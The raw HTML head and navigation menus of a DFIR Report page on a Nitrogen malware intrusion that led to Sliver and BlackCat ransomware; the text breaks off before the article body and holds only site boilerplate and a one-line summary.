<!doctype html>
<html lang="en-US">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width">
	<link rel="profile" href="https://gmpg.org/xfn/11">

	<title>Nitrogen Campaign Drops Sliver and Ends With BlackCat Ransomware &#8211; The DFIR Report</title>
			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 <meta name='robots' content='max-image-preview:large' />
<link rel='dns-prefetch' href='//stats.wp.com' />
<link rel='dns-prefetch' href='//c0.wp.com' />
<link rel="alternate" type="application/rss+xml" title="The DFIR Report &raquo; Feed" href="https://thedfirreport.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="The DFIR Report &raquo; Comments Feed" href="https://thedfirreport.com/comments/feed/" />
<script type="bc235b954ff2c1b7a3b0088b-text/javascript">
/* <![CDATA[ */
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/thedfirreport.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.6.2"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
/* ]]> */
</script>
<link rel='stylesheet' id='jetpack_related-posts-css' href='https://c0.wp.com/p/jetpack/13.9.1/modules/related-posts/related-posts.css' type='text/css' media='all' />
<style id='wp-emoji-styles-inline-css' type='text/css'>

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<link rel='stylesheet' id='wp-block-library-css' href='https://c0.wp.com/c/6.6.2/wp-includes/css/dist/block-library/style.min.css' type='text/css' media='all' />
<link rel='stylesheet' id='mediaelement-css' href='https://c0.wp.com/c/6.6.2/wp-includes/js/mediaelement/mediaelementplayer-legacy.min.css' type='text/css' media='all' />
<link rel='stylesheet' id='wp-mediaelement-css' href='https://c0.wp.com/c/6.6.2/wp-includes/js/mediaelement/wp-mediaelement.min.css' type='text/css' media='all' />
<style id='jetpack-sharing-buttons-style-inline-css' type='text/css'>
.jetpack-sharing-buttons__services-list{display:flex;flex-direction:row;flex-wrap:wrap;gap:0;list-style-type:none;margin:5px;padding:0}.jetpack-sharing-buttons__services-list.has-small-icon-size{font-size:12px}.jetpack-sharing-buttons__services-list.has-normal-icon-size{font-size:16px}.jetpack-sharing-buttons__services-list.has-large-icon-size{font-size:24px}.jetpack-sharing-buttons__services-list.has-huge-icon-size{font-size:36px}@media print{.jetpack-sharing-buttons__services-list{display:none!important}}.editor-styles-wrapper .wp-block-jetpack-sharing-buttons{gap:0;padding-inline-start:0}ul.jetpack-sharing-buttons__services-list.has-background{padding:1.25em 2.375em}
</style>
<style id='classic-theme-styles-inline-css' type='text/css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id='global-styles-inline-css' type='text/css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel='stylesheet' id='freenews-style-css' href='https://thedfirreport.com/wp-content/themes/freenews/style.css?ver=6.6.2' type='text/css' media='all' />
<style id='freenews-style-inline-css' type='text/css'>
.tags-links, .byline, .comments-link { clip: rect(1px, 1px, 1px, 1px); height: 1px; position: absolute; overflow: hidden; width: 1px; }
</style>
<link rel='stylesheet' id='font-awesome-css' href='https://thedfirreport.com/wp-content/themes/freenews/assets/library/fontawesome/css/all.min.css?ver=6.6.2' type='text/css' media='all' />
<link rel='stylesheet' id='freenews-google-fonts-css' href='https://thedfirreport.com/wp-content/fonts/d92fef3d9e5de6f7993b11046e265436.css' type='text/css' media='all' />
<link rel='stylesheet' id='sharedaddy-css' href='https://c0.wp.com/p/jetpack/13.9.1/modules/sharedaddy/sharing.css' type='text/css' media='all' />
<link rel='stylesheet' id='social-logos-css' href='https://c0.wp.com/p/jetpack/13.9.1/_inc/social-logos/social-logos.min.css' type='text/css' media='all' />
<script type="bc235b954ff2c1b7a3b0088b-text/javascript" id="jetpack_related-posts-js-extra">
/* <![CDATA[ */
var related_posts_js_options = {"post_heading":"h4"};
/* ]]> */
</script>
<script type="bc235b954ff2c1b7a3b0088b-text/javascript" src="https://c0.wp.com/p/jetpack/13.9.1/_inc/build/related-posts/related-posts.min.js" id="jetpack_related-posts-js"></script>
<script type="bc235b954ff2c1b7a3b0088b-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/jquery/jquery.min.js" id="jquery-core-js"></script>
<script type="bc235b954ff2c1b7a3b0088b-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/jquery/jquery-migrate.min.js" id="jquery-migrate-js"></script>
<script type="bc235b954ff2c1b7a3b0088b-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/global.js?ver=1" id="freenews-global-js"></script>
<link rel="https://api.w.org/" href="https://thedfirreport.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://thedfirreport.com/wp-json/wp/v2/posts/38756" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://thedfirreport.com/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 6.6.2" />
<link rel="canonical" href="https://thedfirreport.com/2024/09/30/nitrogen-campaign-drops-sliver-and-ends-with-blackcat-ransomware/" />
<link rel='shortlink' href='https://thedfirreport.com/?p=38756' />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://thedfirreport.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fthedfirreport.com%2F2024%2F09%2F30%2Fnitrogen-campaign-drops-sliver-and-ends-with-blackcat-ransomware%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://thedfirreport.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fthedfirreport.com%2F2024%2F09%2F30%2Fnitrogen-campaign-drops-sliver-and-ends-with-blackcat-ransomware%2F&#038;format=xml" />

		<!-- GA Google Analytics @ https://m0n.co/ga -->
		<script async src="https://www.googletagmanager.com/gtag/js?id=UA-162747485-1" type="bc235b954ff2c1b7a3b0088b-text/javascript"></script>
		<script type="bc235b954ff2c1b7a3b0088b-text/javascript">
			window.dataLayer = window.dataLayer || [];
			function gtag(){dataLayer.push(arguments);}
			gtag('js', new Date());
			gtag('config', 'UA-162747485-1');
		</script>

	<script type="bc235b954ff2c1b7a3b0088b-text/javascript">
(function(url){
	if(/(?:Chrome\/26\.0\.1410\.63 Safari\/537\.31|WordfenceTestMonBot)/.test(navigator.userAgent)){ return; }
	var addEvent = function(evt, handler) {
		if (window.addEventListener) {
			document.addEventListener(evt, handler, false);
		} else if (window.attachEvent) {
			document.attachEvent('on' + evt, handler);
		}
	};
	var removeEvent = function(evt, handler) {
		if (window.removeEventListener) {
			document.removeEventListener(evt, handler, false);
		} else if (window.detachEvent) {
			document.detachEvent('on' + evt, handler);
		}
	};
	var evts = 'contextmenu dblclick drag dragend dragenter dragleave dragover dragstart drop keydown keypress keyup mousedown mousemove mouseout mouseover mouseup mousewheel scroll'.split(' ');
	var logHuman = function() {
		if (window.wfLogHumanRan) { return; }
		window.wfLogHumanRan = true;
		var wfscr = document.createElement('script');
		wfscr.type = 'text/javascript';
		wfscr.async = true;
		wfscr.src = url + '&r=' + Math.random();
		(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(wfscr);
		for (var i = 0; i < evts.length; i++) {
			removeEvent(evts[i], logHuman);
		}
	};
	for (var i = 0; i < evts.length; i++) {
		addEvent(evts[i], logHuman);
	}
})('//thedfirreport.com/?wordfence_lh=1&hid=CA367CED275C5934D1C5BED90C52FCD4');
</script>	<style>img#wpstats{display:none}</style>
		<style type="text/css" id="custom-background-css">
body.custom-background { background-color: #f8f8f8; }
</style>
	
<!-- Jetpack Open Graph Tags -->
<meta property="og:type" content="article" />
<meta property="og:title" content="Nitrogen Campaign Drops Sliver and Ends With BlackCat Ransomware" />
<meta property="og:url" content="https://thedfirreport.com/2024/09/30/nitrogen-campaign-drops-sliver-and-ends-with-blackcat-ransomware/" />
<meta property="og:description" content="Key Takeaways In November 2023, we identified a BlackCat ransomware intrusion started by Nitrogen malware hosted on a website impersonating Advanced IP Scanner. Nitrogen was leveraged to deploy Sli…" />
<meta property="article:published_time" content="2024-09-30T00:45:53+00:00" />
<meta property="article:modified_time" content="2024-10-14T12:13:11+00:00" />
<meta property="og:site_name" content="The DFIR Report" />
<meta property="og:image" content="https://thedfirreport.com/wp-content/uploads/2024/09/25590_001.png" />
<meta property="og:image:width" content="2136" />
<meta property="og:image:height" content="1605" />
<meta property="og:image:alt" content="" />
<meta property="og:locale" content="en_US" />
<meta name="twitter:text:title" content="Nitrogen Campaign Drops Sliver and Ends With BlackCat Ransomware" />
<meta name="twitter:image" content="https://thedfirreport.com/wp-content/uploads/2024/09/25590_001.png?w=640" />
<meta name="twitter:card" content="summary_large_image" />

<!-- End Jetpack Open Graph Tags -->
<link rel="icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-32x32.png" sizes="32x32" />
<link rel="icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-192x192.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-180x180.png" />
<meta name="msapplication-TileImage" content="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-270x270.png" />
</head>

<body class="post-template-default single single-post postid-38756 single-format-standard custom-background has-sidebar tags-hidden author-hidden comment-hidden">
	<div id="page" class="site">
	<a class="skip-link screen-reader-text" href="#content">Skip to content</a>

	
	<header id="masthead" class="site-header">
		<div id="main-header" class="main-header">
			<div class="navigation-top">
        		<div class="wrap">
            	<div id="site-header-menu" class="site-header-menu">
               	<nav class="main-navigation" aria-label="Primary Menu" role="navigation">
							    <button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
        <span class="toggle-text">Menu</span>
        <span class="toggle-bar"></span>
    </button>

    <ul id="primary-menu" class="menu nav-menu"><li id="menu-item-21337" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-21337"><a href="https://thedfirreport.com/">Reports</a></li>
<li id="menu-item-21314" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21314"><a href="https://thedfirreport.com/analysts/">Analysts</a></li>
<li id="menu-item-21315" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21315"><a href="https://thedfirreport.com/services/">Services</a>
<ul class="sub-menu">
	<li id="menu-item-21319" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21319"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
	<li id="menu-item-21318" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21318"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
	<li id="menu-item-31055" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31055"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
	<ul class="sub-menu">
		<li id="menu-item-35456" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35456"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
		<li id="menu-item-32606" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32606"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
		<li id="menu-item-38108" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38108"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
	</ul>
</li>
	<li id="menu-item-21320" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21320"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
	<li id="menu-item-21317" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21317"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
	<ul class="sub-menu">
		<li id="menu-item-21325" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21325"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
		<li id="menu-item-21326" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21326"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
	</ul>
</li>
</ul>
</li>
<li id="menu-item-31033" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-31033"><a href="https://store.thedfirreport.com/collections/dfir-labs">Access DFIR Labs</a></li>
<li id="menu-item-21312" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21312"><a href="https://thedfirreport.com/merchandise/">Merchandise</a></li>
<li id="menu-item-21313" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21313"><a href="https://thedfirreport.com/subscribe/">Subscribe</a></li>
<li id="menu-item-21316" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21316"><a href="https://thedfirreport.com/contact/">Contact Us</a></li>
</ul>						 </nav><!-- #site-navigation -->
           		</div>
        		</div><!-- .wrap -->
			</div><!-- .navigation-top -->
			       <nav class="secondary-navigation" role="navigation" aria-label="Secondary Navigation">
            <div class="wrap">
                <button class="secondary-menu-toggle" aria-controls="primary-menu" aria-expanded="false">
                    <span class="secondary-toggle-text">Menu</span>
                    <span class="secondary-toggle-bar"></span>
                </button>
                <ul id="primary-menu" class="secondary-menu"><li id="menu-item-21323" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21323"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li id="menu-item-21322" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21322"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li id="menu-item-31037" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31037"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
	<li id="menu-item-35457" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35457"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
	<li id="menu-item-32608" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32608"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
	<li id="menu-item-38110" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38110"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li id="menu-item-21321" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21321"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
	<li id="menu-item-21327" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21327"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
	<li id="menu-item-21328" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21328"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
<li id="menu-item-21324" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21324"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
</ul>            </div><!-- .wrap -->
        </nav><!-- .secondary-navigation -->       
			<div class="main-header-brand">
				<div class="header-brand">
					<div class="wrap">
						<div class="header-brand-content">
							    <div class="site-branding">
                <div class="site-branding-text">

                           <p class="site-title"><a href="https://thedfirreport.com/" rel="home">The DFIR Report</a></p>
                                <p class="site-description">Real Intrusions by Real Attackers, The Truth Behind the Intrusion</p>
            
        </div><!-- .site-branding-text -->
    </div><!-- .site-branding -->


							<div class="header-right">
								<div class="header-banner">

																	</div><!-- .header-banner -->
							</div><!-- .header-right -->
						</div><!-- .header-brand-content -->
					</div><!-- .wrap -->
				</div><!-- .header-brand -->

				<div id="nav-sticker">
					<div class="navigation-top">
						<div class="wrap">
							<div id="site-header-menu" class="site-header-menu">
								<nav id="site-navigation" class="main-navigation" aria-label="Primary Menu">
								    <button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
        <span class="toggle-text">Menu</span>
        <span class="toggle-bar"></span>
    </button>

    <ul id="primary-menu" class="menu nav-menu"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-21337"><a href="https://thedfirreport.com/">Reports</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21314"><a href="https://thedfirreport.com/analysts/">Analysts</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21315"><a href="https://thedfirreport.com/services/">Services</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21319"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21318"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31055"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
	<ul class="sub-menu">
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35456"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
